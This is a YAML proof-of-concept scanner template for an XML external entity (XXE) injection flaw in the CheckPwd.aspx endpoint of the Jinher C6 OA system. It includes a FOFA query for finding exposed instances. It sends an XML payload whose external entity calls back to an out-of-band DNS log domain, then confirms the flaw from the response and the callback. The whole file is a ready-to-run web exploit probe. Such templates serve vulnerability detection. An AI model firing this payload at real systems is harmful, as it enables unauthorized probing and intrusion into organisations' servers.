id: poc-yaml-jinher-checkpwd-aspx-xxe
info:
  name: 金和C6 CheckPwd.aspx XML实体注入漏洞
  severity: high
  tags:
  - DNSLOG
  - xxe
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: POST
  path: /C6/JHSoft.Web.WorkFlat/CheckPwd.aspx/
  headers:
    Content-Type: application/xml
  data: '<?xml version="1.0" encoding="UTF-8"?>

    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{.domain}}"> %remote;]>'
  expression: 'status_code == 200 &&

    body == "" &&

    contains(headers,"SessionId=") &&

    reverse.Verify()

    '
transport: http
